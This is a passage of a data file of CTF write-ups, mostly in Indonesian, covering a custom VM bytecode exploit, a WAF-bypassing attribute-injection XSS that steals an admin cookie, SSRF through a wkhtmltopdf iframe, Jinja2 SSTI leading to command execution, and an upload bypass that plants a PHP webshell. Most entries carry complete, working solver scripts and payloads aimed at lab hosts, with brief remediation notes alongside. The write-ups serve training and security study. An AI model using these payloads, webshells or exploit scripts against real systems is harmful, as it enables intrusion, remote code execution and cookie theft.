        "code": "#!/usr/bin/env python3\r\nimport re\r\nimport socket\r\nimport sys\r\nfrom typing import Optional\r\n\r\nHOST = sys.argv[1] if len(sys.argv) > 1 else \"10.42.5.10\"\r\nPORT = int(sys.argv[2]) if len(sys.argv) > 2 else 1337\r\n\r\n# Valid 16-byte AI key derived from the VM constraints.\r\nKEY = b\"API-@d!!?@??AUUU\"\r\n\r\n\r\ndef li(reg: int, val: int) -> bytes:\r\n    return bytes([reg & 0xff, 0x21, val & 0xff])\r\n\r\n\r\ndef push(reg: int) -> bytes:\r\n    return bytes([reg & 0xff, 0x24, 0x00])\r\n\r\n\r\ndef mov(dst: int, src: int) -> bytes:\r\n    return bytes([dst & 0xff, 0x26, src & 0xff])\r\n\r\n\r\ndef sysc(num: int, dst: int = 0) -> bytes:\r\n    return bytes([num & 0xff, 0x41, dst & 0xff])\r\n\r\n\r\ndef halt() -> bytes:\r\n    return b\"\\x00\\x42\\x00\"\r\n\r\n\r\ndef build_stage(path: bytes = b\"/flag.txt\") -> bytes:\r\n    \"\"\"Build second-stage VM bytecode: open(path), read flag, write it.\"\"\"\r\n    prog = b\"\"\r\n\r\n    # Put the path on the VM stack in forward order.\r\n    for ch in path[::-1]:\r\n        prog += li(0, ch)\r\n        prog += push(0)\r\n\r\n    # r0 = stack pointer, r1 = len(path), sys3 = open(path)\r\n    prog += mov(0, 4)\r\n    prog += li(1, len(path))\r\n    prog += sysc(3, 2)\r\n\r\n    # Read up to 255 bytes from the opened fd into mem[0:255].\r\n    # sys1 returns the byte count in r2.\r\n    prog += li(0, 0)\r\n    prog += li(1, 0xff)\r\n    prog += sysc(1, 2)\r\n\r\n    # Write exactly the returned byte count from mem[0].\r\n    prog += li(0, 0)\r\n    prog += mov(1, 2)\r\n    prog += sysc(2, 0)\r\n    prog += halt()\r\n    return prog\r\n\r\n\r\ndef extract_flag(data: bytes) -> Optional[bytes]:\r\n    patterns = [\r\n        rb\"[A-Za-z0-9_\\-]+\\{[^}\\r\\n\\x00]+\\}\",\r\n        rb\"flag\\{[^}\\r\\n\\x00]+\\}\",\r\n    ]\r\n    for pat in patterns:\r\n        m = re.search(pat, data, re.IGNORECASE)\r\n        if m:\r\n            return m.group(0)\r\n    return None\r\n\r\n\r\ndef main() -> int:\r\n    payload = KEY + build_stage()\r\n\r\n    with socket.create_connection((HOST, PORT), timeout=8) as s:\r\n        s.settimeout(1.0)\r\n\r\n        # The service prints \"AI Key: \" before reading. Do not depend on it;\r\n        # send the key and second-stage bytecode even if the prompt is delayed.\r\n        banner = b\"\"\r\n        try:\r\n            banner = s.recv(1024)\r\n        except socket.timeout:\r\n            pass\r\n\r\n        s.sendall(payload)\r\n        try:\r\n            s.shutdown(socket.SHUT_WR)\r\n        except OSError:\r\n            pass\r\n\r\n        chunks = [banner]\r\n        s.settimeout(5.0)\r\n        while True:\r\n            try:\r\n                chunk = s.recv(4096)\r\n            except socket.timeout:\r\n                break\r\n            if not chunk:\r\n                break\r\n            chunks.append(chunk)\r\n\r\n    data = b\"\".join(chunks)\r\n    flag = extract_flag(data)\r\n    if flag:\r\n        print(f\"<FLAG>{flag.decode('utf-8', 'replace')}</FLAG>\")\r\n    else:\r\n        sys.stdout.buffer.write(data)\r\n        if data and not data.endswith(b\"\\n\"):\r\n            print()\r\n    return 0\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    raise SystemExit(main())"
      }
    ],
    "terminalOutputs": [],
    "flag": "RMCTF{5p34k1n6_1n_c0d3!}",
    "lessonsLearned": ""
  },
  {
    "id": "ram-web-covbooks",
    "title": "CTF — Cov Books",
    "category": "Web",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-07-08",
    "author": "Nattt",
    "ctfName": "RAM",
    "tags": [],
    "description": "**Event:** RAM CTF  \n**Category:** Web  \n**Difficulty:** Medium  \n**Flag:** `RAM{4ttr_1nj3ct_w4f_byp4ss_1br4ry}`",
    "problemDescription": "| # | Vulnerability | Detail |\n|---|---|---|\n| 1 | **Attribute Injection / Reflected XSS** | Input `q` dimasukkan ke atribut `value` tanpa sanitasi yang benar sehingga attacker bisa menutup atribut dan menambahkan event handler |\n| 2 | **Weak WAF Filtering** | WAF hanya memblokir pola HTML/script umum, tetapi gagal mendeteksi injeksi atribut yang lebih sederhana |\n| 3 | **Internal Admin Visit Feature** | `report.php` mengizinkan attacker membuat admin membuka URL internal yang berisi payload berbahaya |\n| 4 | **Sensitive Cookie in Admin Context** | Flag tersedia di cookie admin dan bisa dicuri melalui XSS |\n| 5 | **Exfiltration Sink in Application** | `/messages.php` bisa dipakai sebagai kanal exfil data hasil XSS |\n\n---",
    "tools": [
      "curl",
      "Python standard library — membuat solver HTTP sederhana",
      "Browser parsing knowledge — menyusun payload yang valid untuk konteks atribut unquoted"
    ],
    "analysis": "Halaman utama menampilkan katalog buku dan sebuah fitur pencarian dengan parameter `q`.\n\nDi navbar juga ada halaman lain yang menarik:\n\n- `/report.php`\n- `/messages.php`\n\n`/report.php` menerima URL lalu mengirimkannya ke admin internal untuk direview.  \n`/messages.php` menampilkan balasan atau pesan yang masuk.",
    "solution": [
      {
        "title": "Challenge Description",
        "content": "> The Coventry Digital Library lets students search the book catalogue by title, author, or genre.\n>\n> The team recently added a WAF after an incident. They're confident it blocks all injection attempts.\n\n**URL:** `http://10.42.5.10`\n\n---"
      },
      {
        "title": "Step 2 — Understand the Search Reflection",
        "content": "Input `q` direfleksikan kembali ke atribut `value` pada elemen input pencarian:\n\n\n\nSaat payload HTML tag biasa dicoba, WAF memblokirnya:\n\n\n\nTetapi WAF ternyata tidak memblokir **attribute injection**. Payload seperti ini lolos:\n\n\n\nDan dirender menjadi:\n\n\n\nArtinya kita bisa keluar dari atribut `value` dan menambahkan atribut/event handler baru ke elemen input.",
        "code": "<input type=\"text\" name=\"q\" value=\"USER_INPUT\" placeholder=\"Search by title, author or genre…\">"
      },
      {
        "title": "Step 3 — Inspect the Message Sink",
        "content": "Halaman `/messages.php` awalnya terlihat seperti message board biasa.  \nSetelah diuji, endpoint ini ternyata menyimpan pesan lewat **POST**, bukan lewat query string.\n\nContoh:\n\n\n\nLalu `test123` muncul di daftar message.\n\nIni penting karena nanti XSS bisa dipakai untuk mengirim data hasil curian ke message board itu sendiri.",
        "code": "curl -i -X POST http://10.42.5.10/messages.php -d 'msg=test123'"
      },
      {
        "title": "Step 4 — Understand the Admin Visit Flow",
        "content": "`/report.php` hanya menerima URL internal challenge, dengan petunjuk:\n\n- `http://web/`\n- `http://localhost:8080/`\n\nBerarti ada admin bot yang akan membuka URL internal tersebut.  \nKalau kita bisa membuat admin membuka halaman dengan payload XSS, maka JavaScript akan dieksekusi dalam konteks admin.\n\n---"
      },
      {
        "title": "Step 5 — Build a WAF Bypass XSS Payload",
        "content": "Karena payload ditempatkan di atribut tanpa quote tambahan pada event handler, JavaScript harus dibuat tanpa string literal biasa agar parser HTML tidak rusak.\n\nPayload final:\n\n\n\nTujuan payload:\n\n1. keluar dari `value=\"...\"`\n2. menambahkan `autofocus`\n3. menambahkan `onfocus=...`\n4. saat admin membuka halaman, browser admin otomatis fokus ke input\n5. event `onfocus` mengeksekusi `fetch()` ke `/messages.php`\n6. data yang dikirim adalah `document.cookie`\n\nPayload di-URL-encode lalu disisipkan ke URL berikut:",
        "code": "\" autofocus onfocus=fetch(String.fromCharCode(47,109,101,115,115,97,103,101,115,46,112,104,112),{method:String.fromCharCode(80,79,83,84),body:new(URLSearchParams)({msg:document.cookie})}) x=\""
      },
      {
        "title": "Step 6 — Send the Payload to Admin",
        "content": "Admin bot mengunjungi URL tersebut, payload berjalan, lalu cookie admin dipost ke `/messages.php`.",
        "code": "curl -X POST http://10.42.5.10/report.php \\\n  --data-urlencode 'url=http://localhost:8080/?q=%22%20autofocus%20onfocus%3Dfetch(String.fromCharCode(47,109,101,115,115,97,103,101,115,46,112,104,112),%7Bmethod%3AString.fromCharCode(80,79,83,84),body%3Anew(URLSearchParams)(%7Bmsg%3Adocument.cookie%7D)%7D)%20x%3D%22'"
      },
      {
        "title": "Step 7 — Read the Leaked Cookie",
        "content": "Setelah dipoll dari `/messages.php`, muncul pesan berikut:\n\n\n\nItu adalah cookie yang masih URL-encoded.\n\nDecode hasilnya:\n\n\n\nSehingga flag-nya adalah:\n\n\n\n---",
        "code": "flag%3DRAM%7B4ttr_1nj3ct_w4f_byp4ss_1br4ry%7D"
      },
      {
        "title": "Solver",
        "content": "Berikut solver Python yang mereproduksi exploit tanpa perlu langkah manual:\n\n\n\nFile solver sudah disiapkan sebagai [`solver.py`](/home/nata/ctf/RAM/web/Covbooks/solver.py).\n\n---",
        "code": "#!/usr/bin/env python3\nimport html\nimport re\nimport sys\nimport time\nfrom urllib.parse import quote, unquote\nfrom urllib.request import Request, urlopen\n\nBASE_URL = \"http://10.42.5.10\"\n\ndef http_request(path, method=\"GET\", data=None, timeout=10):\n    url = f\"{BASE_URL}{path}\"\n    body = None\n    headers = {}\n    if data is not None:\n        body = data.encode()\n        headers[\"Content-Type\"] = \"application/x-www-form-urlencoded\"\n\n    req = Request(url, data=body, method=method, headers=headers)\n    with urlopen(req, timeout=timeout) as resp:\n        return resp.read().decode(\"utf-8\", errors=\"replace\")\n\ndef clear_messages():\n    http_request(\"/messages.php?clear=1\")\n\ndef build_payload():\n    js = (\n        \"fetch(String.fromCharCode(47,109,101,115,115,97,103,101,115,46,112,104,112),\"\n        \"{method:String.fromCharCode(80,79,83,84),\"\n        \"body:new(URLSearchParams)({msg:document.cookie})})\"\n    )\n    injected = f'\\\" autofocus onfocus={js} x=\\\"'\n    return quote(injected, safe=\"\")\n\ndef submit_report():\n    payload = build_payload()\n    target = f\"http://localhost:8080/?q={payload}\"\n    data = \"url=\" + quote(target, safe=\"\")\n    return http_request(\"/report.php\", method=\"POST\", data=data)\n\ndef extract_entries(page):\n    pattern = re.compile(r'<div class=\\\"entry\\\">\\\\[[^\\\\]]+\\\\] msg=(.*?)</div>', re.DOTALL)\n    return [html.unescape(match) for match in pattern.findall(page)]\n\ndef find_flag(entries):\n    for entry in entries:\n        decoded = unquote(entry)\n        flag_match = re.search(r\"RAM\\\\{[^}]+\\\\}\", decoded)\n        if flag_match:\n            return flag_match.group(0)\n\n        cookie_match = re.search(r\"flag=([^;]+)\", decoded)\n        if cookie_match:\n            maybe_flag = unquote(cookie_match.group(1))\n            flag_match = re.search(r\"RAM\\\\{[^}]+\\\\}\", maybe_flag)\n            if flag_match:\n                return flag_match.group(0)\n    return None\n\ndef poll_flag(max_attempts=20, delay=2):\n    for _ in range(max_attempts):\n        page = http_request(\"/messages.php\")\n        entries = extract_entries(page)\n        flag = find_flag(entries)\n        if flag:\n            return flag\n        time.sleep(delay)\n    return None\n\ndef main():\n    clear_messages()\n    submit_report()\n    flag = poll_flag()\n    if not flag:\n        print(\"flag not found\", file=sys.stderr)\n        sys.exit(1)\n    print(flag)\n\nif __name__ == \"__main__\":\n    main()"
      },
      {
        "title": "Remediation",
        "content": "1. **Escape output sesuai konteks** — input yang dimasukkan ke atribut HTML harus di-encode khusus untuk konteks atribut\n2. **Gunakan CSP yang ketat** — blok inline event handler seperti `onfocus=...`\n3. **Jangan expose admin bot ke URL attacker-controlled tanpa isolasi** — gunakan sandbox atau strip script-capable input\n4. **Jangan simpan flag/secret di cookie yang bisa diakses JavaScript** — gunakan `HttpOnly`\n5. **WAF bukan pengganti secure coding** — filter pola tidak akan cukup kalau sink utamanya tetap vulnerable\n\n---"
      },
      {
        "title": "Attack Flow",
        "content": "",
        "code": "Open /\n   │\n   ▼\nFind reflected input in:\n<input value=\"USER_INPUT\">\n   │\n   ▼\nTest WAF bypass with attribute injection\n   │\n   ▼\nDiscover /report.php and /messages.php\n   │\n   ▼\nConfirm /messages.php stores msg via POST\n   │\n   ▼\nUse /report.php to make admin visit:\nhttp://localhost:8080/?q=<XSS payload>\n   │\n   ▼\nPayload triggers onfocus and POSTs document.cookie\nto /messages.php\n   │\n   ▼\nRead leaked cookie from message board\n   │\n   ▼\nDecode:\nflag%3DRAM%7B4ttr_1nj3ct_w4f_byp4ss_1br4ry%7D\n   │\n   ▼\nFlag:\nRAM{4ttr_1nj3ct_w4f_byp4ss_1br4ry}"
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solver.py) is provided below:",
        "code": "#!/usr/bin/env python3\r\nimport html\r\nimport re\r\nimport sys\r\nimport time\r\nfrom urllib.parse import quote, unquote\r\nfrom urllib.request import Request, urlopen\r\n\r\n\r\nBASE_URL = \"http://10.42.5.10\"\r\n\r\n\r\ndef http_request(path, method=\"GET\", data=None, timeout=10):\r\n    url = f\"{BASE_URL}{path}\"\r\n    body = None\r\n    headers = {}\r\n    if data is not None:\r\n        body = data.encode()\r\n        headers[\"Content-Type\"] = \"application/x-www-form-urlencoded\"\r\n\r\n    req = Request(url, data=body, method=method, headers=headers)\r\n    with urlopen(req, timeout=timeout) as resp:\r\n        return resp.read().decode(\"utf-8\", errors=\"replace\")\r\n\r\n\r\ndef clear_messages():\r\n    http_request(\"/messages.php?clear=1\")\r\n\r\n\r\ndef build_payload():\r\n    js = (\r\n        \"fetch(String.fromCharCode(47,109,101,115,115,97,103,101,115,46,112,104,112),\"\r\n        \"{method:String.fromCharCode(80,79,83,84),\"\r\n        \"body:new(URLSearchParams)({msg:document.cookie})})\"\r\n    )\r\n    injected = f'\" autofocus onfocus={js} x=\"'\r\n    return quote(injected, safe=\"\")\r\n\r\n\r\ndef submit_report():\r\n    payload = build_payload()\r\n    target = f\"http://localhost:8080/?q={payload}\"\r\n    data = \"url=\" + quote(target, safe=\"\")\r\n    return http_request(\"/report.php\", method=\"POST\", data=data)\r\n\r\n\r\ndef extract_entries(page):\r\n    pattern = re.compile(r'<div class=\"entry\">\\[[^\\]]+\\] msg=(.*?)</div>', re.DOTALL)\r\n    return [html.unescape(match) for match in pattern.findall(page)]\r\n\r\n\r\ndef find_flag(entries):\r\n    for entry in entries:\r\n        decoded = unquote(entry)\r\n        flag_match = re.search(r\"RAM\\{[^}]+\\}\", decoded)\r\n        if flag_match:\r\n            return flag_match.group(0)\r\n\r\n        cookie_match = re.search(r\"flag=([^;]+)\", decoded)\r\n        if cookie_match:\r\n            maybe_flag = unquote(cookie_match.group(1))\r\n            flag_match = re.search(r\"RAM\\{[^}]+\\}\", maybe_flag)\r\n            if flag_match:\r\n                return flag_match.group(0)\r\n    return None\r\n\r\n\r\ndef poll_flag(max_attempts=20, delay=2):\r\n    for attempt in range(1, max_attempts + 1):\r\n        page = http_request(\"/messages.php\")\r\n        entries = extract_entries(page)\r\n        flag = find_flag(entries)\r\n        if flag:\r\n            return flag\r\n        print(f\"[-] attempt {attempt}/{max_attempts}: flag belum muncul\", file=sys.stderr)\r\n        time.sleep(delay)\r\n    return None\r\n\r\n\r\ndef main():\r\n    print(\"[*] clearing message store\", file=sys.stderr)\r\n    clear_messages()\r\n\r\n    print(\"[*] submitting admin-XSS payload\", file=sys.stderr)\r\n    submit_report()\r\n\r\n    print(\"[*] polling messages for leaked cookie\", file=sys.stderr)\r\n    flag = poll_flag()\r\n    if not flag:\r\n        print(\"[!] flag tidak ditemukan\", file=sys.stderr)\r\n        sys.exit(1)\r\n\r\n    print(flag)\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    main()"
      }
    ],
    "terminalOutputs": [],
    "flag": "RAM{4ttr_1nj3ct_w4f_byp4ss_1br4ry}",
    "lessonsLearned": ""
  },
  {
    "id": "ram-web-pdfify",
    "title": "PDFify",
    "category": "Web",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-07-08",
    "author": "Nattt",
    "ctfName": "RAM",
    "tags": [],
    "description": "Writeup for challenge PDFify",
    "problemDescription": "Challenge ini kelihatannya seperti SSRF biasa: kita kasih URL, server fetch halaman itu, lalu render jadi PDF. Di halaman utama ada dua petunjuk yang sangat membantu:\n\n- ada komentar `internal metrics service available on port 3000 (localhost only)`\n- hasil resolusi DNS target URL dibocorkan lewat panel debug\n\nAwalnya saya coba bypass filter SSRF langsung ke `127.0.0.1:3000`, variasi integer/octal/IPv6, sampai redirect dari host eksternal. Semuanya mentok di validasi.\n\nTitik baliknya datang saat sadar bahwa yang dibatasi cuma **URL utama** yang kita submit. Setelah lolos validasi, halaman itu akan dirender oleh `wkhtmltopdf`. Berarti kalau saya bisa memberi **halaman HTML eksternal yang saya kontrol**, saya bisa menyuruh browser internal milik `wkhtmltopdf` memuat resource lain sendiri, termasuk `localhost`.",
    "tools": [],
    "analysis": "Target:\n\n- `http://10.42.5.10/`\n- stack: `Apache/2.4.65`, `PHP/8.1.34`\n- renderer: `wkhtmltopdf 0.12.6` (terlihat dari metadata PDF hasil generate)\n\nBeberapa temuan awal:\n\n- `http://127.0.0.1:3000/` diblok dengan pesan `Invalid or disallowed IP`\n- `http://127.0.0.1/server-status` kemungkinan menarik karena `/server-status` dari luar memberi `403`\n- redirect ke `localhost` juga tetap diblok\n\nJadi bypass di level URL utama bukan jalur termudah.",
    "solution": [
      {
        "title": "Ide eksploitasi",
        "content": "Saya butuh halaman eksternal yang isinya bisa saya set sendiri tanpa harus punya server publik. Untuk itu saya pakai endpoint reflektor sederhana:\n\n- `https://httpbin.org/base64/<base64_html>`\n\nEndpoint ini mengembalikan isi HTML yang kita encode, jadi aplikasi target menganggap ini URL eksternal biasa dan membiarkannya lewat.\n\nTes pertama:\n\n\n\nSetelah dirender, teks itu benar-benar muncul di PDF. Artinya kontrol HTML penuh berhasil.",
        "code": "<html><body><h1>CTFTEST123</h1><p>hello world</p></body></html>"
      },
      {
        "title": "Pivot ke localhost",
        "content": "Berikutnya saya masukkan iframe ke service internal:\n\n\n\nHasil PDF menampilkan:\n\n\n\nBerarti service di `localhost:3000` bisa diakses oleh browser internal milik `wkhtmltopdf`, walaupun URL utama tidak boleh langsung menunjuk ke sana.",
        "code": "<html><body>\n  <iframe src=\"http://127.0.0.1:3000/\" width=\"1200\" height=\"2000\"></iframe>\n</body></html>"
      },
      {
        "title": "Kenapa ini berhasil",
        "content": "Masalah utamanya ada di model keamanan aplikasi:\n\n1. URL yang di-submit memang divalidasi agar tidak langsung menuju host internal.\n2. Tapi setelah URL lolos, konten HTML dari URL itu dirender oleh `wkhtmltopdf`.\n3. Browser internal di dalam `wkhtmltopdf` masih bebas memuat iframe ke `127.0.0.1`.\n4. Akhirnya tercipta SSRF tahap kedua lewat resource yang di-embed, bukan lewat URL utama.\n\nIni secara praktis adalah server-side browsing ke resource internal."
      },
      {
        "title": "Catatan",
        "content": "- Mencoba `file:///etc/passwd` tidak berhasil karena diblok policy WebKit (`Error 102`).\n- `iframe` ke `127.0.0.1/server-status` juga berhasil dan membuktikan resource localhost memang bisa diambil saat render.\n- Nama challenge dan flag mengarah ke isu DNS rebinding / TOCTOU, tapi jalur yang paling pendek di instance ini justru SSRF lewat embedded resource pada renderer."
      }
    ],
    "terminalOutputs": [],
    "flag": "RAM{dns_r3b1nd_t0ctou_D1u4le_A_R3cord}",
    "lessonsLearned": ""
  },
  {
    "id": "ram-web-ssti",
    "title": "SSTI (Insecure Dropdown)",
    "category": "Web",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-07-08",
    "author": "Nattt",
    "ctfName": "RAM",
    "tags": [],
    "description": "CTF Writeup: SSTI (Insecure Dropdown)\n1. Deskripsi Tantangan\nTantangan ini menyajikan sebuah aplikasi web sederhana berbasis Flask yang menanyakan model AI favorit pengguna. Terdapat dua input: sebuah dropdown menu di /announce dan sebuah input teks di /.",
    "problemDescription": "CTF Writeup: SSTI (Insecure Dropdown)\n1. Deskripsi Tantangan\nTantangan ini menyajikan sebuah aplikasi web sederhana berbasis Flask yang menanyakan model AI favorit pengguna. Terdapat dua input: sebuah dropdown menu di /announce dan sebuah input teks di /.\n\n2. Tahap Identifikasi (Detection)\nLangkah pertama adalah melakukan testing apakah input tersebut dirender oleh template engine di sisi server. Digunakan payload matematis standar:\n\nPayload: {{7*7}}\n\nTarget: Parameter ai pada endpoint /announce.\n\nHasil: Server merespons dengan angka 49.\n\nHal ini mengonfirmasi adanya celah Server-Side Template Injection (SSTI) menggunakan engine Jinja2 (Python).\n\n3. Tahap Eksplorasi (Exploration)\nSetelah celah ditemukan, dilakukan pengecekan terhadap objek config untuk melihat informasi sensitif di lingkungan Flask.\n\nCommand:\n\nBash\ncurl -X POST -d \"user={{config}}\" http://10.42.5.10:5000/\nHasil: Muncul konfigurasi aplikasi, namun tidak ada flag langsung di sana.\n\n4. Tahap Eksploitasi (Remote Code Execution)\nUntuk mendapatkan flag, kita perlu melakukan eksekusi perintah sistem (RCE). Kita memanfaatkan objek cycler yang tersedia di Jinja2 untuk mencapai modul os.\n\nLangkah A: Mencari Lokasi Flag\nDigunakan perintah find untuk mencari file dengan nama \"flag\".\n\nCommand:\n\nBash\n    curl -s -X POST 'http://10.42.5.10:5000/announce' \\\n    --data-urlencode \"ai={{cycler.__init__.__globals__.os.popen('find / -maxdepth 2 -name \\\"*flag*\\\"').read()}}\"\n    ```\n*   **Hasil:** Ditemukan file di `/flag.txt`.\n\n**Langkah B: Membaca Flag**\nGunakan `cat` untuk membaca isi file tersebut.\n*   **Command:**\n    \n```bash\n    curl -s -X POST 'http://10.42.5.10:5000/announce' \\\n    --data-urlencode \"ai={{cycler.__init__.__globals__.os.popen('cat /flag.txt').read()}}\"\n    ```",
    "tools": [],
    "analysis": "",
    "solution": [],
    "terminalOutputs": [],
    "flag": "RAM{ins3cure_dr0pdown}",
    "lessonsLearned": ""
  },
  {
    "id": "ram-web-submission",
    "title": "Submission Portal",
    "category": "Web",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-07-08",
    "author": "Nattt",
    "ctfName": "RAM",
    "tags": [],
    "description": "Writeup for challenge Submission Portal",
    "problemDescription": "Challenge ini terlihat seperti upload image biasa yang sudah \"dipatch\":\n\n- extension dibatasi ke `jpg`, `jpeg`, `png`, `gif`\n- MIME dicek dengan `getimagesize()`\n- file diproses ulang lewat GD supaya payload yang ditempel di akhir file hilang\n\nAwalnya semua itu memang kelihatan benar. Upload JPEG/PNG/GIF normal diproses ulang, payload PHP yang ditempel ikut hilang, dan double extension seperti `.php.jpg` tidak dieksekusi.\n\nTitik lemahnya ternyata bukan di filter image-nya, tapi di **cara validasi itu diaktifkan**.",
    "tools": [],
    "analysis": "",
    "solution": [
      {
        "title": "Bug Utama",
        "content": "Dari source `upload.php`, blok validasi image hanya jalan kalau ada field POST `submit`:\n\n\n\nArtinya:\n\n- kalau request dibuat dari form normal, field `submit` ikut terkirim dan semua filter jalan\n- kalau request dikirim manual tanpa field `submit`, validasi image **tidak jalan sama sekali**\n\nTetapi proses berikut ini tetap berjalan:\n\n- penentuan nama file dari `$_FILES[\"fileToUpload\"][\"name\"]`\n- pengecekan `file_exists()`\n- pengecekan ukuran file\n- `move_uploaded_file()`\n\nJadi kita bisa upload **file mentah apa pun** selama nama file akhirnya terlihat seperti ekstensi yang diizinkan.",
        "code": "if (isset($_POST[\"submit\"])) {\n    ...\n}"
      },
      {
        "title": "Bug Kedua: Null Byte pada Nama File",
        "content": "Nama file diambil dari:\n\n\n\nDengan filename seperti:\n\n\n\naplikasi melihat extension `jpg`, jadi lolos whitelist extension. Tapi saat file dipindah ke filesystem, nama efektif terpotong di null byte dan file tersimpan sebagai:\n\n\n\nTrik yang sama bisa dipakai untuk:\n\n\n\nyang akhirnya tersimpan sebagai:",
        "code": "$target_file = $target_dir . basename($_FILES[\"fileToUpload\"][\"name\"]);"
      },
      {
        "title": "1. Upload `.htaccess`",
        "content": "Karena validasi image sengaja dilewati dengan **tidak mengirim field `submit`**, kita bisa upload isi `.htaccess` mentah:\n\n\n\nNama file yang dipakai:\n\n\n\nHasilnya file tersimpan sebagai `.htaccess` di folder `/submissions/`.",
        "code": "AddType application/x-httpd-php .nata\nAddHandler application/x-httpd-php .nata"
      },
      {
        "title": "2. Upload webshell",
        "content": "Lalu upload file PHP sederhana dengan nama:\n\n\n\nIsi file:\n\n\n\nKarena `.htaccess` tadi sudah membuat `.nata` diproses sebagai PHP, file itu sekarang bisa dieksekusi lewat browser.",
        "code": "probe.nata\\x00.jpg"
      },
      {
        "title": "3. Validasi RCE",
        "content": "Request:\n\n\n\nOutput:\n\n\n\nBerarti RCE berhasil.",
        "code": "/submissions/probe.nata?cmd=id"
      },
      {
        "title": "Kenapa Patch Sebelumnya Gagal",
        "content": "Patch yang ada sebenarnya lumayan rapat kalau request datang dari form normal:\n\n- whitelist extension\n- MIME check\n- re-encode lewat GD\n\nMasalahnya semua itu diletakkan di dalam:\n\n\n\nJadi keamanan aplikasi bergantung pada ada tidaknya satu field form yang bisa dengan mudah dihilangkan saat request dibuat manual.",
        "code": "if (isset($_POST[\"submit\"]))"
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
        "code": "#!/usr/bin/env python3\r\n\r\nimport argparse\r\nimport re\r\nimport sys\r\nfrom typing import Optional\r\nfrom urllib.parse import quote\r\n\r\nimport requests\r\n\r\n\r\nHTACCESS_NAME = b\".htaccess\\x00.jpg\"\r\nHTACCESS_BODY = b\"AddType application/x-httpd-php .nata\\nAddHandler application/x-httpd-php .nata\\n\"\r\n\r\nSHELL_NAME = b\"probe.nata\\x00.jpg\"\r\nSHELL_BODY = b'<?php echo \"OK:\"; system($_GET[\"cmd\"] ?? \"id\"); ?>'\r\n\r\n\r\ndef extract_uploaded_name(html: str) -> Optional[str]:\r\n    match = re.search(r\"The file ([^<]+?) has been uploaded\\.\", html)\r\n    if match:\r\n        return match.group(1)\r\n    return None\r\n\r\n\r\ndef upload_raw(session: requests.Session, base_url: str, raw_name: bytes, content: bytes) -> str:\r\n    response = session.post(\r\n        f\"{base_url}/upload.php\",\r\n        files={\"fileToUpload\": (raw_name, content, \"image/jpeg\")},\r\n        timeout=15,\r\n    )\r\n    response.raise_for_status()\r\n\r\n    uploaded_name = extract_uploaded_name(response.text)\r\n    if not uploaded_name:\r\n        snippet = re.sub(r\"\\s+\", \" \", response.text)[:400]\r\n        raise RuntimeError(f\"upload failed for {raw_name!r}: {snippet}\")\r\n    return uploaded_name\r\n\r\n\r\ndef exec_cmd(session: requests.Session, base_url: str, shell_name: str, cmd: str) -> str:\r\n    url = f\"{base_url}/submissions/{quote(shell_name)}?cmd={quote(cmd)}\"\r\n    response = session.get(url, timeout=20)\r\n    response.raise_for_status()\r\n    return response.text\r\n\r\n\r\ndef main() -> int:\r\n    parser = argparse.ArgumentParser(description=\"Exploit Submission Portal and print the flag.\")\r\n    parser.add_argument(\"base_url\", nargs=\"?\", default=\"http://10.42.5.10\", help=\"Target base URL\")\r\n    parser.add_argument(\"--flag-path\", default=\"/flag.txt\", help=\"Path to the flag file\")\r\n    parser.add_argument(\"--shell-name\", default=\"probe.nata\", help=\"Expected shell filename after null-byte truncation\")\r\n    args = parser.parse_args()\r\n\r\n    base_url = args.base_url.rstrip(\"/\")\r\n    session = requests.Session()\r\n\r\n    print(\"[*] Uploading .htaccess\")\r\n    uploaded_htaccess = upload_raw(session, base_url, HTACCESS_NAME, HTACCESS_BODY)\r\n    print(f\"[+] Stored as: {uploaded_htaccess}\")\r\n\r\n    print(\"[*] Uploading webshell\")\r\n    uploaded_shell = upload_raw(session, base_url, SHELL_NAME, SHELL_BODY)\r\n    print(f\"[+] Stored as: {uploaded_shell}\")\r\n\r\n    print(\"[*] Verifying code execution\")\r\n    whoami = exec_cmd(session, base_url, args.shell_name, \"whoami\")\r\n    print(whoami.strip())\r\n\r\n    print(\"[*] Reading flag\")\r\n    flag = exec_cmd(session, base_url, args.shell_name, f\"cat {args.flag_path}\")\r\n    print(flag.strip())\r\n\r\n    return 0\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    try:\r\n        raise SystemExit(main())\r\n    except KeyboardInterrupt:\r\n        print(\"\\n[!] Interrupted\", file=sys.stderr)\r\n        raise SystemExit(130)"
      }
    ],
    "terminalOutputs": [],
    "flag": "RAM{m1ssing_subm1t_b0undary_brEAks_th3_g4te}",
    "lessonsLearned": ""
  }
];
